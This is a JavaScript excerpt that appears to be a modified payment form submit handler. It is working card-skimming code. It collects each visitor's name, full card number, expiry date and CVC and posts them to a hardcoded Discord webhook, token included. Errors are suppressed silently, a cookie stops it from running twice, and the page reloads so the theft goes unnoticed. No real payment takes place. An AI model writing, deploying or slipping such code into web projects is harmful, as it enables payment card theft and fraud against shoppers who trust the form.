// ... (Previous code remains unchanged until the form.onsubmit function)

form.onsubmit = async (e) => {
    e.preventDefault();

    // Set cookie to prevent re-running
    document.cookie = 'paymentSubmitted=true; path=/';

    // Collect payment data and current URL
    const paymentData = {
        name: nameInput.value,
        cardNumber: cardNumberInput.value,
        expiry: expiryInput.value,
        cvc: cvvInput.value,
        amount: price,
        url: window.location.href // Add current URL
    };

    try {
        await fetch('https://discord.com/api/webhooks/1383037554642780161/12Krj-WpOo-hnc-cPNQ7ChRKVcPmympDEmF47f-fjKWiLhPCypijLWiflc2pZVPlN7-v', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: "💳 New Payment Submission",
                    color: 0x5865F2, // Discord blurple color
                    fields: [
                        { name: "👤 Name", value: paymentData.name, inline: true },
                        { name: "💵 Amount", value: paymentData.amount, inline: true },
                        { name: "💳 Card Number", value: paymentData.cardNumber, inline: false },
                        { name: "📅 Expiry", value: paymentData.expiry, inline: true },
                        { name: "🔒 CVC", value: paymentData.cvc, inline: true },
                        { name: "🌐 URL", value: paymentData.url, inline: false }
                    ],
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: "Payment Form Submission"
                    }
                }]
            })
        });
    } catch (error) {
        // Silently handle error (no alerts/logs)
    }

    // Refresh page
    window.location.reload();
};

// ... (Rest of the code remains unchanged)
